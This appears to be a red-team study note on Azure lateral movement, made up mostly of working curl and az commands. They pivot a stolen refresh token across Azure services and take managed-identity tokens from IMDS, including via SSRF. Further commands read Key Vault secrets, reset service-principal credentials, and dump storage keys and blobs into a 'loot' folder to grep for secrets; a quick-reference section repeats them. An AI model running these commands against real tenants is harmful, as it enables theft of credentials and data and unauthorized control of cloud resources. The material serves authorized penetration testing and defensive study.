# 06.3 — Azure Lateral Movement

## What This Note Covers

Moving laterally within Azure — token pivoting across resources, managed identity chaining, Key Vault as a pivot point, App Registration credential abuse, and using AzureHound to map paths.

---

## Token Pivoting Across Azure Resources

A single refresh token or access token can be exchanged for tokens scoped to different Azure resources. This lets you pivot from one service to another using the same underlying identity.

```bash
# Token pivot: exchange a refresh token for different resource scopes

# ARM token (manage Azure resources)
curl -X POST "https://login.microsoftonline.com/TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c\
&grant_type=refresh_token\
&refresh_token=REFRESH_TOKEN\
&scope=https://management.azure.com/.default"

# Graph API token (Azure AD operations)
curl -X POST "https://login.microsoftonline.com/TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c\
&grant_type=refresh_token\
&refresh_token=REFRESH_TOKEN\
&scope=https://graph.microsoft.com/.default"

# Key Vault token
curl -X POST "https://login.microsoftonline.com/TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c\
&grant_type=refresh_token\
&refresh_token=REFRESH_TOKEN\
&scope=https://vault.azure.net/.default"

# Storage token
curl -X POST "https://login.microsoftonline.com/TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c\
&grant_type=refresh_token\
&refresh_token=REFRESH_TOKEN\
&scope=https://storage.azure.com/.default"
```

> [!tip] One refresh token, all Azure services
> A refresh token from a device code phishing attack or token theft lets you access every Azure service the compromised identity has permissions on — ARM, Graph, Key Vault, Storage, Databricks, etc. Try all resource scopes.

## Managed Identity Lateral Movement Chain

The most reliable Azure lateral movement pattern:

```
VM/Function/App Service
  → Managed Identity (IMDS token)
  → ARM: list subscriptions, resource groups, resources
  → Key Vault: read secrets
  → Secrets contain: SP credentials / DB passwords / API keys
  → Authenticate as SP
  → SP has broader permissions → escalate further
```

### Step-by-Step

```bash
# Step 1: Get managed identity ARM token (from VM or via SSRF)
ARM_TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# Step 2: Identify accessible resources
curl -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"

SUB_ID="YOUR_SUB_ID"
curl -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/$SUB_ID/resources?api-version=2021-04-01" \
  | python3 -m json.tool | grep '"type"\|"name"'

# Step 3: Find Key Vaults
curl -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/$SUB_ID/resources?api-version=2021-04-01&\$filter=resourceType eq 'Microsoft.KeyVault/vaults'" \
  | python3 -m json.tool

# Step 4: Get Key Vault token
KV_TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# Step 5: List and read Key Vault secrets
VAULT_NAME="target-vault"
curl -H "Authorization: Bearer $KV_TOKEN" \
  "https://$VAULT_NAME.vault.azure.net/secrets?api-version=7.4"

# Read a specific secret
curl -H "Authorization: Bearer $KV_TOKEN" \
  "https://$VAULT_NAME.vault.azure.net/secrets/sp-client-secret?api-version=7.4" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])"

# Step 6: Authenticate as the SP found in the vault
az login --service-principal \
  --username SP_CLIENT_ID \
  --password "SECRET_VALUE_FROM_VAULT" \
  --tenant TENANT_ID
```

## Service Principal Credential Abuse

App Registrations in Azure AD have service principals. SPs can have credentials (client secrets or certificates) and role assignments. Finding or creating SP credentials is Azure lateral movement.

```bash
# Find service principals with interesting role assignments
az ad sp list --all --query "[].{Name:displayName,Id:id,AppId:appId}" -o table

# For each SP, check its Azure RBAC roles
for SP_ID in $(az ad sp list --all --query "[].id" -o tsv); do
  ROLES=$(az role assignment list --assignee $SP_ID --all -o table 2>/dev/null)
  if echo "$ROLES" | grep -qiE "Owner|Contributor|Admin"; then
    echo "=== HIGH PRIVILEGE SP: $SP_ID ==="
    echo "$ROLES"
  fi
done

# Check SP Azure AD directory roles (Graph permissions)
az rest --method GET \
  --url "https://graph.microsoft.com/v1.0/servicePrincipals/SP_OBJECT_ID/memberOf" \
  | python3 -m json.tool

# Add credentials to a SP you have access to (Application Admin or SP Owner)
az ad sp credential reset \
  --id SP_APP_ID \
  --display-name "pivot-cred" \
  --years 1
# Returns new client_id and client_secret

# Log in as the SP
az login --service-principal \
  --username APP_ID \
  --password CLIENT_SECRET \
  --tenant TENANT_ID
```

## Storage Account as Lateral Movement Source

Storage accounts often contain application code, config files, Terraform state, and deployment packages — all of which may contain credentials for further pivoting.

```bash
# List storage accounts
az storage account list --output table

# Get the account key (requires Microsoft.Storage/storageAccounts/listKeys)
az storage account keys list \
  --account-name TARGET_STORAGE \
  --resource-group RG \
  --query "[0].value" -o tsv

# List all containers
az storage container list \
  --account-name TARGET_STORAGE \
  --account-key KEY \
  --output table

# List and download all blobs (recursively)
az storage blob download-batch \
  --destination ./loot \
  --source CONTAINER_NAME \
  --account-name TARGET_STORAGE \
  --account-key KEY

# Search for credentials
grep -r "password\|secret\|key\|ConnectionString\|DefaultEndpointsProtocol" ./loot/
```

## Azure Resource Manager — Moving Between Resource Groups

If you have Owner/Contributor on one resource group, use it to reach resources in adjacent groups or access shared infrastructure.

```bash
# List all resource groups you have access to
az group list --output table

# List resources in a specific group
az resource list --resource-group TARGET_RG --output table

# Check RBAC assignments on adjacent resource groups
az role assignment list --resource-group OTHER_RG --output table

# If a shared Key Vault exists in another RG:
az keyvault list --resource-group SHARED_SERVICES_RG
az keyvault secret list --vault-name SHARED_VAULT
```

## Quick Reference — Azure Lateral Movement

```bash
# Token pivot to different resources
# (replace scope= with target resource URL)
curl -X POST "https://login.microsoftonline.com/TENANT/oauth2/v2.0/token" \
  -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&grant_type=refresh_token&refresh_token=RT&scope=https://management.azure.com/.default"

# Managed identity token from IMDS
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# SP enumeration and credential reset
az ad sp list --all --output table
az role assignment list --assignee SP_ID --all
az ad sp credential reset --id APP_ID --display-name cred --years 1
az login --service-principal --username APP_ID --password SECRET --tenant TENANT_ID

# Storage account access
az storage account keys list --account-name ACCOUNT --resource-group RG
az storage blob download-batch --destination ./loot --source CONTAINER \
  --account-name ACCOUNT --account-key KEY
```
